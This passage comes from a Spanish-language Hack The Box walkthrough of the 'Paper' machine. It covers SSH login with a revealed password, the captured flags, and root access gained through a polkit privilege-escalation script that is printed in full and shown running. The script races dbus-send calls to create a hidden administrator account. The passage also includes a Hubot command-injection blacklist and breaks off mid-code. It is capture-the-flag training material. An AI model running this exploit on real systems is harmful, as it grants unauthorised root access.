            </div>
            <h2 id="shell">Shell</h2>
            <p>Usamos la contraseña por SSH con el usuario <code>dwight</code>, logramos obtener una shell y la flag
              <code>user.txt</code>.</p>
            <div class="highlight">
              <div class="chroma">
                <table class="lntable">
                  <tr>
                    <td class="lntd">
                      <pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span></code></pre>
                    </td>
                    <td class="lntd">
                      <pre class="chroma"><code class="language-bash" data-lang="bash"> π ~/htb/paper ❯ ssh dwight@office.paper <span class="c1"># Queenofblad3s!23</span>
dwight@office.paper<span class="err">&#39;</span>s password:
Activate the web console with: systemctl <span class="nb">enable</span> --now cockpit.socket

Last login: Sat Feb  <span class="m">5</span> 20:12:06 <span class="m">2022</span> from 10.10.14.133
<span class="o">[</span>dwight@paper ~<span class="o">]</span>$ whoami<span class="p">;</span>id<span class="p">;</span><span class="nb">pwd</span>
dwight
<span class="nv">uid</span><span class="o">=</span>1004<span class="o">(</span>dwight<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1004<span class="o">(</span>dwight<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1004<span class="o">(</span>dwight<span class="o">)</span>
/home/dwight
<span class="o">[</span>dwight@paper ~<span class="o">]</span>$ ls
bot_restart.sh	hubot  pk.sh  sales  user.txt
<span class="o">[</span>dwight@paper ~<span class="o">]</span>$ cat user.txt
70b576347b2ee4017a05dd869dfcb5fa
<span class="o">[</span>dwight@paper ~<span class="o">]</span>$
</code></pre>
                    </td>
                  </tr>
                </table>
              </div>
            </div>
            <h1 id="privesc">Privesc</h1>
            <p>Enumeramos la carpeta del usuario dwight, encontramos un script en bash <code>pk.sh</code>.</p>
            <div class="highlight">
              <div class="chroma">
                <table class="lntable">
                  <tr>
                    <td class="lntd">
                      <pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre>
                    </td>
                    <td class="lntd">
                      <pre class="chroma"><code class="language-bash" data-lang="bash"><span class="o">[</span>dwight@paper ~<span class="o">]</span>$ ll
total <span class="m">16</span>
-rwxr-xr-x <span class="m">1</span> dwight dwight <span class="m">1174</span> Sep <span class="m">16</span> 06:58 bot_restart.sh
drwx------ <span class="m">8</span> dwight dwight <span class="m">4096</span> Sep <span class="m">16</span> 07:57 hubot
-rwxrwxr-x <span class="m">1</span> dwight dwight <span class="m">2812</span> Jan <span class="m">14</span> 06:48 pk.sh
drwxr-xr-x <span class="m">4</span> dwight dwight   <span class="m">32</span> Jul  <span class="m">3</span>  <span class="m">2021</span> sales
-r-------- <span class="m">1</span> dwight dwight   <span class="m">33</span> Feb  <span class="m">5</span> 15:18 user.txt
<span class="o">[</span>dwight@paper ~<span class="o">]</span>$ file pk.sh
pk.sh: Bourne-Again shell script, ASCII text executable
<span class="o">[</span>dwight@paper ~<span class="o">]</span>$
</code></pre>
                    </td>
                  </tr>
                </table>
              </div>
            </div>
            <h2 id="polkit">Polkit</h2>
            <p>El script realiza una explotiación en la API de polkit, registra el usuario <code>hacked</code> con la
              contraseña <code>password</code>, agregando este como usuario privilegiado. Todo indica que se trata de un
              exploit para la <a
                href="https://github.blog/2021-06-10-privilege-escalation-polkit-root-on-linux-with-bug/">vulnerabilidad
                en polkit</a> para escalar privilegios.<br />
              <div class="expand">
                <button type="button" class="expand__button" aria-label="Expand Button">
                  <span class="expand-icon expand-icon__right">
                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24">
                      <path fill="currentColor"
                        d="M9.29 15.88L13.17 12 9.29 8.12c-.39-.39-.39-1.02 0-1.41.39-.39 1.02-.39 1.41 0l4.59 4.59c.39.39.39 1.02 0 1.41L10.7 17.3c-.39.39-1.02.39-1.41 0-.38-.39-.39-1.03 0-1.42z" />
                    </svg>
                  </span>
                  Expand me: pk.sh
                </button>
                <div class="expand__content">
                  <div class="highlight">
                    <div class="chroma">
                      <table class="lntable">
                        <tr>
                          <td class="lntd">
                            <pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span></code></pre>
                          </td>
                          <td class="lntd">
                            <pre class="chroma"><code class="language-bash" data-lang="bash"><span class="cp">#!/bin/bash
</span><span class="cp"></span>
<span class="c1"># Set the name and display name</span>
<span class="nv">userName</span><span class="o">=</span><span class="s2">&#34;hacked&#34;</span>
<span class="nv">realName</span><span class="o">=</span><span class="s2">&#34;hacked&#34;</span>

<span class="c1"># Set the account as an administrator</span>
<span class="nv">accountType</span><span class="o">=</span><span class="m">1</span>

<span class="c1"># Set the password hash for &#39;password&#39; and password hint</span>
<span class="nv">password</span><span class="o">=</span><span class="s1">&#39;$5$WR3c6uwMGQZ/JEZw$OlBVzagNJswkWrKRSuoh/VCrZv183QpZL7sAeskcoTB&#39;</span>
<span class="nv">passHint</span><span class="o">=</span><span class="s2">&#34;password&#34;</span>

<span class="c1"># Check Polkit version</span>
<span class="nv">polkitVersion</span><span class="o">=</span><span class="k">$(</span>systemctl status polkit.service <span class="p">|</span> grep version <span class="p">|</span> cut -d <span class="s2">&#34; &#34;</span> -f 9<span class="k">)</span>
<span class="k">if</span> <span class="o">[[</span> <span class="s2">&#34;</span><span class="k">$(</span>apt list --installed 2&gt;/dev/null <span class="p">|</span> grep polkit <span class="p">|</span> grep -c 0.105-26<span class="k">)</span><span class="s2">&#34;</span> -ge <span class="m">1</span> <span class="o">||</span> <span class="s2">&#34;</span><span class="k">$(</span>yum list installed <span class="p">|</span> grep polkit <span class="p">|</span> grep -c 0.117-2<span class="k">)</span><span class="s2">&#34;</span> <span class="o">]]</span><span class="p">;</span> <span class="k">then</span>
<span class="nb">echo</span> <span class="s2">&#34;[*] Vulnerable version of polkit found&#34;</span>
<span class="k">else</span>
<span class="nb">echo</span> <span class="s2">&#34;[!] WARNING: Version of polkit might not vulnerable&#34;</span>
<span class="k">fi</span>

<span class="c1"># Validate user is running in SSH instead of desktop terminal</span>
<span class="k">if</span> <span class="o">[[</span> -z <span class="nv">$SSH_CLIENT</span> <span class="o">||</span> -z <span class="nv">$SSH_TTY</span> <span class="o">]]</span><span class="p">;</span> <span class="k">then</span>
<span class="nb">echo</span> <span class="s2">&#34;[!] WARNING: SSH into localhost first before running this script in order to avoid authentication prompts&#34;</span>
<span class="nb">exit</span>
<span class="k">fi</span>

<span class="c1"># Test the dbus-send timing to load into exploit</span>
<span class="nb">echo</span> <span class="s2">&#34;[*] Determining dbus-send timing&#34;</span>
<span class="nv">realTime</span><span class="o">=</span><span class="k">$(</span> <span class="nv">TIMEFORMAT</span><span class="o">=</span><span class="s2">&#34;%R&#34;</span><span class="p">;</span> <span class="o">{</span> <span class="nb">time</span> dbus-send --system --dest<span class="o">=</span>org.freedesktop.Accounts --type<span class="o">=</span>method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:<span class="nv">$userName</span> string:<span class="nv">$realName</span> int32:<span class="nv">$accountType</span> <span class="p">;</span> <span class="o">}</span> 2&gt;<span class="p">&amp;</span><span class="m">1</span> <span class="p">|</span> cut -d <span class="s2">&#34; &#34;</span> -f6 <span class="k">)</span>
<span class="nv">halfTime</span><span class="o">=</span><span class="k">$(</span><span class="nb">echo</span> <span class="s2">&#34;scale=3;</span><span class="nv">$realTime</span><span class="s2">/2&#34;</span> <span class="p">|</span> bc<span class="k">)</span>

<span class="c1"># Check for user first in case previous run of script failed on password set</span>
<span class="k">if</span> id <span class="s2">&#34;</span><span class="nv">$userName</span><span class="s2">&#34;</span> <span class="p">&amp;</span>&gt;/dev/null<span class="p">;</span> <span class="k">then</span>
<span class="nv">userid</span><span class="o">=</span><span class="k">$(</span>id -u <span class="nv">$userName</span><span class="k">)</span>
<span class="nb">echo</span> <span class="s2">&#34;[*] New user </span><span class="nv">$userName</span><span class="s2"> already exists with uid of </span><span class="nv">$userid</span><span class="s2">&#34;</span>
<span class="k">else</span>
<span class="nv">userid</span><span class="o">=</span><span class="s2">&#34;&#34;</span>
<span class="nb">echo</span> <span class="s2">&#34;[*] Attempting to create account&#34;</span>
<span class="k">while</span> <span class="o">[[</span> <span class="nv">$userid</span> <span class="o">==</span> <span class="s2">&#34;&#34;</span> <span class="o">]]</span>
<span class="k">do</span>
dbus-send --system --dest<span class="o">=</span>org.freedesktop.Accounts --type<span class="o">=</span>method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:<span class="nv">$userName</span> string:<span class="nv">$realName</span> int32:<span class="nv">$accountType</span> 2&gt;/dev/null <span class="p">&amp;</span> sleep <span class="nv">$halfTime</span> <span class="p">;</span> <span class="nb">kill</span> <span class="nv">$!</span> 2&gt;/dev/null
<span class="k">if</span> id <span class="s2">&#34;</span><span class="nv">$userName</span><span class="s2">&#34;</span> <span class="p">&amp;</span>&gt;/dev/null<span class="p">;</span> <span class="k">then</span>
<span class="nv">userid</span><span class="o">=</span><span class="k">$(</span>id -u <span class="nv">$userName</span><span class="k">)</span>
<span class="nb">echo</span> <span class="s2">&#34;[*] New user </span><span class="nv">$userName</span><span class="s2"> created with uid of </span><span class="nv">$userid</span><span class="s2">&#34;</span>
<span class="k">fi</span>
<span class="k">done</span>
<span class="k">fi</span>

<span class="c1"># Add the password to /etc/shadow</span>
<span class="c1"># Sleep added to ensure there is enough of a delay between timestamp checks</span>
<span class="nb">echo</span> <span class="s2">&#34;[*] Adding password to /etc/shadow and enabling user&#34;</span>
sleep <span class="m">1</span>
<span class="nv">currentTimestamp</span><span class="o">=</span><span class="k">$(</span>stat -c %Z /etc/shadow<span class="k">)</span>
<span class="nv">fileChanged</span><span class="o">=</span><span class="s2">&#34;n&#34;</span>
<span class="k">while</span> <span class="o">[</span> <span class="nv">$fileChanged</span> <span class="o">==</span> <span class="s2">&#34;n&#34;</span> <span class="o">]</span>
<span class="k">do</span>
dbus-send --system --dest<span class="o">=</span>org.freedesktop.Accounts --type<span class="o">=</span>method_call --print-reply /org/freedesktop/Accounts/User<span class="nv">$userid</span> org.freedesktop.Accounts.User.SetPassword string:<span class="nv">$password</span> string:<span class="nv">$passHint</span> 2&gt;/dev/null <span class="p">&amp;</span> sleep <span class="nv">$halfTime</span> <span class="p">;</span> <span class="nb">kill</span> <span class="nv">$!</span> 2&gt;/dev/null
<span class="k">if</span> <span class="o">[</span> <span class="k">$(</span>stat -c %Z /etc/shadow<span class="k">)</span> -ne <span class="nv">$currentTimestamp</span> <span class="o">]</span><span class="p">;</span><span class="k">then</span>
<span class="nv">fileChanged</span><span class="o">=</span><span class="s2">&#34;y&#34;</span>
<span class="nb">echo</span> <span class="s2">&#34;[*] Exploit complete!&#34;</span>
<span class="k">fi</span>
<span class="k">done</span>

<span class="nb">echo</span> <span class="s2">&#34;&#34;</span>
<span class="nb">echo</span> <span class="s2">&#34;[*] Run &#39;su - </span><span class="nv">$userName</span><span class="s2">&#39;, followed by &#39;sudo su&#39; to gain root access&#34;</span>
</code></pre>
                          </td>
                        </tr>
                      </table>
                    </div>
                  </div>
                </div>
              </div>
            </p>
            <p>Utilizamos este mismo script para realizar la explotación, tras un primer intento pareciera no funcionar,
              aun asi muestra que todo fue exitoso.</p>
            <div class="highlight">
              <div class="chroma">
                <table class="lntable">
                  <tr>
                    <td class="lntd">
                      <pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span></code></pre>
                    </td>
                    <td class="lntd">
                      <pre class="chroma"><code class="language-bash" data-lang="bash"><span class="o">[</span>dwight@paper ~<span class="o">]</span>$ ./pk.sh
Invalid configuration value: <span class="nv">failovermethod</span><span class="o">=</span>priority in /etc/yum.repos.d/nodesource-el8.repo<span class="p">;</span> Configuration: OptionBinding with id <span class="s2">&#34;failovermethod&#34;</span> does not exist
Invalid configuration value: <span class="nv">failovermethod</span><span class="o">=</span>priority in /etc/yum.repos.d/nodesource-el8.repo<span class="p">;</span> Configuration: OptionBinding with id <span class="s2">&#34;failovermethod&#34;</span> does not exist
Modular dependency problems:

 Problem 1: conflicting requests
  - nothing provides module<span class="o">(</span>perl:5.26<span class="o">)</span> needed by module perl-IO-Socket-SSL:2.066:8030020201222215140:1e4bbb35.x86_64
 Problem 2: conflicting requests
  - nothing provides module<span class="o">(</span>perl:5.26<span class="o">)</span> needed by module perl-libwww-perl:6.34:8030020201223164340:b967a9a2.x86_64
<span class="o">[</span>*<span class="o">]</span> Vulnerable version of polkit found
<span class="o">[</span>*<span class="o">]</span> Determining dbus-send timing
<span class="o">[</span>*<span class="o">]</span> Attempting to create account
./pk.sh: line 48: <span class="m">21609</span> Terminated              dbus-send --system --dest<span class="o">=</span>org.freedesktop.Accounts --type<span class="o">=</span>method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:<span class="nv">$userName</span> string:<span class="nv">$realName</span> int32:<span class="nv">$accountType</span> 2&gt; /dev/null
<span class="o">[</span>.. snip ..<span class="o">]</span>
./pk.sh: line 48: <span class="m">27079</span> Terminated              dbus-send --system --dest<span class="o">=</span>org.freedesktop.Accounts --type<span class="o">=</span>method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:<span class="nv">$userName</span> string:<span class="nv">$realName</span> int32:<span class="nv">$accountType</span> 2&gt; /dev/null
<span class="o">[</span>*<span class="o">]</span> New user hacked created with uid of <span class="m">1005</span>
<span class="o">[</span>*<span class="o">]</span> Adding password to /etc/shadow and enabling user
<span class="o">[</span>*<span class="o">]</span> Exploit complete!

<span class="o">[</span>*<span class="o">]</span> Run <span class="s1">&#39;su - hacked&#39;</span>, followed by <span class="s1">&#39;sudo su&#39;</span> to gain root access
<span class="o">[</span>dwight@paper ~<span class="o">]</span>$ su - hacked
su: user hacked does not exist
<span class="o">[</span>dwight@paper ~<span class="o">]</span>$
</code></pre>
                    </td>
                  </tr>
                </table>
              </div>
            </div>
            <h2 id="shell-1">Shell</h2>
            <p>Tras una segunda ejecución vemos que el usuario es registrado, y obtiene privilegio root.</p>
            <div class="highlight">
              <div class="chroma">
                <table class="lntable">
                  <tr>
                    <td class="lntd">
                      <pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span></code></pre>
                    </td>
                    <td class="lntd">
                      <pre class="chroma"><code class="language-bash" data-lang="bash"><span class="o">[</span>dwight@paper ~<span class="o">]</span>$ ./pk.sh
Invalid configuration value: <span class="nv">failovermethod</span><span class="o">=</span>priority in /etc/yum.repos.d/nodesource-el8.repo<span class="p">;</span> Configuration: OptionBinding with id <span class="s2">&#34;failovermethod&#34;</span> does not exist
<span class="o">[</span>..snip ..<span class="o">]</span>
<span class="o">[</span>*<span class="o">]</span> Exploit complete!
./pk.sh: line 64: <span class="m">31284</span> Terminated              dbus-send --system --dest<span class="o">=</span>org.freedesktop.Accounts --type<span class="o">=</span>method_call --print-reply /org/freedesktop/Accounts/User<span class="nv">$userid</span> org.freedesktop.Accounts.User.SetPassword string:<span class="nv">$password</span> string:<span class="nv">$passHint</span> 2&gt; /dev/null

<span class="o">[</span>*<span class="o">]</span> Run <span class="s1">&#39;su - hacked&#39;</span>, followed by <span class="s1">&#39;sudo su&#39;</span> to gain root access
<span class="o">[</span>dwight@paper ~<span class="o">]</span>$ su - hacked
Password:
<span class="o">[</span>hacked@paper ~<span class="o">]</span>$ id
<span class="nv">uid</span><span class="o">=</span>1005<span class="o">(</span>hacked<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1005<span class="o">(</span>hacked<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1005<span class="o">(</span>hacked<span class="o">)</span>,10<span class="o">(</span>wheel<span class="o">)</span>
<span class="o">[</span>hacked@paper ~<span class="o">]</span>$ sudo su
<span class="o">[</span>sudo<span class="o">]</span> password <span class="k">for</span> hacked:
<span class="o">[</span>root@paper hacked<span class="o">]</span><span class="c1"># id</span>
<span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
</code></pre>
                    </td>
                  </tr>
                </table>
              </div>
            </div>
            <p>Finalmente la flag <code>root.txt</code></p>
            <div class="highlight">
              <div class="chroma">
                <table class="lntable">
                  <tr>
                    <td class="lntd">
                      <pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre>
                    </td>
                    <td class="lntd">
                      <pre class="chroma"><code class="language-bash" data-lang="bash"><span class="o">[</span>root@paper hacked<span class="o">]</span><span class="c1"># cd /root</span>
<span class="o">[</span>root@paper ~<span class="o">]</span><span class="c1"># ls</span>
anaconda-ks.cfg  initial-setup-ks.cfg  root.txt
<span class="o">[</span>root@paper ~<span class="o">]</span><span class="c1"># cat root.txt</span>
65da21d38614e574d8c1990545f2b49b
<span class="o">[</span>root@paper ~<span class="o">]</span>#
</code></pre>
                    </td>
                  </tr>
                </table>
              </div>
            </div>
            <ul>
              <li>
                <p><em><strong>Nota</strong>: en este caso utilizamos el script almacenado en la máquina, sugiero
                    visitar el Write-up de <a href="https://0xdf.gitlab.io/2022/06/18/htb-paper.html#shell-as-root">0xdf
                      - HTB Paper</a>.</em></p>
              </li>
              <li>
                <p><strong>Paper</strong>: <a
                    href="https://secnigma.wordpress.com/2022/06/18/the-idea-behind-paper/">Post del autor</a> que habla
                  sobre el proceso e ideas de la creación de la máquina.</p>
              </li>
            </ul>
            <h2 id="hubot-cronjob">Hubot, Cronjob</h2>
            <p>Vemos que existe un cronjob que restaura el archivo <code>/etc/passwd</code> y <code>/etc/shadow</code>,
              es por ello que el primer intento con <code>pk.sh</code> no funcionó.</p>
            <div class="highlight">
              <div class="chroma">
                <table class="lntable">
                  <tr>
                    <td class="lntd">
                      <pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre>
                    </td>
                    <td class="lntd">
                      <pre class="chroma"><code class="language-bash" data-lang="bash"><span class="o">[</span>root@paper ~<span class="o">]</span><span class="c1"># crontab -l</span>
*/2 * * * * /root/.restore/restore.sh
<span class="o">[</span>root@paper ~<span class="o">]</span><span class="c1"># cat /root/.restore/restore.sh</span>
<span class="c1">#!/bin/bash</span>

<span class="k">for</span> u in <span class="sb">`</span>/usr/bin/comm -23 /etc/passwd /root/.restore/passwd <span class="p">|</span> cut -d <span class="s1">&#39;:&#39;</span> -f1<span class="sb">`</span>
<span class="k">do</span>
    /usr/sbin/userdel -fr <span class="s2">&#34;</span><span class="nv">$u</span><span class="s2">&#34;</span>
<span class="k">done</span>

cp -a /root/.restore/<span class="o">{</span>passwd,shadow<span class="o">}</span> /etc
<span class="o">[</span>root@paper ~<span class="o">]</span>#
</code></pre>
                    </td>
                  </tr>
                </table>
              </div>
            </div>
            <p>Vemos el codigo de los comandos <code>files</code> y <code>list</code>, en ambos existe un
              &ldquo;filtro&rdquo; para ciertos caracteres que no permite realizar &lsquo;Command
              Injection&rsquo;.<br />
              <div class="expand">
                <button type="button" class="expand__button" aria-label="Expand Button">
                  <span class="expand-icon expand-icon__right">
                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24">
                      <path fill="currentColor"
                        d="M9.29 15.88L13.17 12 9.29 8.12c-.39-.39-.39-1.02 0-1.41.39-.39 1.02-.39 1.41 0l4.59 4.59c.39.39.39 1.02 0 1.41L10.7 17.3c-.39.39-1.02.39-1.41 0-.38-.39-.39-1.03 0-1.42z" />
                    </svg>
                  </span>
                  hubot/{files,listof}
                </button>
                <div class="expand__content">
                  <div class="highlight">
                    <div class="chroma">
                      <table class="lntable">
                        <tr>
                          <td class="lntd">
                            <pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span></code></pre>
                          </td>
                          <td class="lntd">
                            <pre class="chroma"><code class="language-javascript" data-lang="javascript"><span class="nx">scripts</span><span class="o">/</span><span class="nx">files</span><span class="p">.</span><span class="nx">js</span>
<span class="c1">// Description:
</span><span class="c1">// Runs a command on hubot
</span><span class="c1">// TOTAL VIOLATION of any and all security!
</span><span class="c1">//
</span><span class="c1">// Commands:
</span><span class="c1">// hubot run &lt;command&gt; - runs a command on hubot host
</span><span class="c1"></span>
<span class="nx">module</span><span class="p">.</span><span class="nx">exports</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(</span><span class="nx">robot</span><span class="p">)</span> <span class="p">{</span>
  <span class="kd">var</span> <span class="nx">user</span> <span class="o">=</span> <span class="s2">&#34;dwight&#34;</span><span class="p">;</span>
  <span class="nx">robot</span><span class="p">.</span><span class="nx">respond</span><span class="p">(</span><span class="s2">&#34;/file (.*)$/i&#34;</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">msg</span><span class="p">)</span> <span class="p">{</span>
    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">msg</span><span class="p">);</span>
    <span class="kd">var</span> <span class="nx">out</span> <span class="o">=</span> <span class="nx">msg</span><span class="p">.</span><span class="nx">match</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
<span class="c1">// Don&#39;t judge me. If it is working, then it ain&#39;t stupid.
</span><span class="c1"></span>    <span class="k">if</span><span class="p">((</span><span class="nx">out</span><span class="p">.</span><span class="nx">includes</span><span class="p">(</span><span class="s2">&#34;;&#34;</span><span class="p">))</span> <span class="o">||</span> <span class="p">(</span><span class="nx">out</span><span class="p">.</span><span class="nx">includes</span><span class="p">(</span><span class="s2">&#34;`&#34;</span><span class="p">))</span> <span class="o">||</span> <span class="p">(</span><span class="nx">out</span><span class="p">.</span><span class="nx">includes</span><span class="p">(</span><span class="s2">&#34;&amp;&#34;</span><span class="p">))</span> <span class="o">||</span> <span class="p">(</span><span class="nx">out</span><span class="p">.</span><span class="nx">includes</span><span class="p">(</span><span class="s2">&#34;$&#34;</span><span class="p">))</span> <span class="o">||</span> <span class="p">(</span><span class="nx">out</span><span class="p">.</span><span class="nx">includes</span><span class="p">(</span><span class="s2">&#34;0x0a&#34;</span><span class="p">))</span> <span class="o">||</span> <span class="p">(</span><span class="nx">out</span><span class="p">.</span><span class="nx">includes</span><span class="p">(</span><span class="s2">&#34;\\n&#34;</span><span class="p">))</span><span class="o">||</span> <span class="p">(</span><span class="nx">out</span><span class="p">.</span><span class="nx">includes</span><span class="p">(</span><span class="s2">&#34;*&#34;</span><span class="p">))</span> <span class="o">||</span> <span class="p">(</span><span class="nx">out</span><span class="p">.</span><span class="nx">includes</span><span class="p">(</span><span class="s2">&#34;?&#34;</span><span class="p">))</span> <span class="o">||</span> <span class="p">(</span><span class="nx">out</span><span class="p">.</span><span class="nx">includes</span><span class="p">(</span><span class="s2">&#34;|&#34;</span><span class="p">))</span> <span class="o">||</span> <span class="p">(</span><span class="nx">out</span><span class="p">.</span><span class="nx">includes</span><span class="p">(</span><span class="s2">&#34;[&#34;</span><span class="p">))</span> <span class="o">||</span> <span class="p">(</span><span class="nx">out</span><span class="p">.</span><span class="nx">includes</span><span class="p">(</span><span class="s2">&#34;{&#34;</span><span class="p">))</span> <span class="o">||</span> <span class="p">(</span><span class="nx">out</span><span class="p">.</span><span class="nx">includes</span><span class="p">(</span><span class="s2">&#34;(&#34;</span><span class="p">))</span> <span class="o">||</span> <span class="p">(</span><span class="nx">out</span><span class="p">.</span><span class="nx">includes</span><span class="p">(</span><span class="s2">&#34;\&#34;&#34;</span><span class="p">))</span> <span class="o">||</span> <span class="p">(</span><span class="nx">out</span><span class="p">.</span><span class="nx">includes</span><span class="p">(</span><span class="s2">&#34;\\&#34;</span><span class="p">))</span>  <span class="o">||</span> <span class="p">(</span><span class="nx">out</span><span class="p">.</span><span class="nx">includes</span><span class="p">(</span><span class="s2">&#34;&gt;&#34;</span><span class="p">))</span> <span class="o">||</span> <span class="p">(</span><span class="nx">out</span><span class="p">.</span><span class="nx">includes</span><span class="p">(</span><span class="s2">&#34;&lt;&#34;</span><span class="p">))</span> <span class="o">||</span> <span class="p">(</span><span class="nx">out</span><span class="p">.</span><span class="nx">includes</span><span class="p">(</span><span class="s2">&#34;&#39;&#34;</span><span class="p">))</span> <span class="o">||</span> <span class="p">(</span><span class="nx">out</span><span class="p">.</span><span class="nx">includes</span><span class="p">(</span><span class="s2">&#34;%&#34;</span><span class="p">))</span> <span class="p">){</span>
	     <span class="nx">msg</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="s2">&#34;Stop injecting OS commands!&#34;</span><span class="p">);</span>
	     <span class="k">return</span><span class="p">;</span>
  <span class="p">}</span>

         <span class="k">if</span><span class="p">(</span><span class="nx">out</span><span class="p">.</span><span class="nx">includes</span><span class="p">(</span><span class="s2">&#34;user&#34;</span><span class="p">)){</span>
        <span class="nx">msg</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="s2">&#34;Access denied.&#34;</span><span class="p">);</span>
	<span class="k">return</span><span class="p">;</span>
    <span class="p">}</span>	
    <span class="k">else</span><span class="p">{</span> 	
    <span class="kd">var</span> <span class="nx">cmd</span> <span class="o">=</span> <span class="s2">&#34;cat &#34;</span> <span class="o">+</span> <span class="s2">&#34; &#34;</span> <span class="o">+</span><span class="s2">&#34;/home/&#34;</span><span class="o">+</span><span class="nx">user</span><span class="o">+</span><span class="s2">&#34;/sales/&#34;</span><span class="o">+</span> <span class="nx">out</span><span class="p">;</span>
    <span class="kd">var</span> <span class="nx">exec</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;child_process&#39;</span><span class="p">).</span><span class="nx">exec</span><span class="p">;</span>
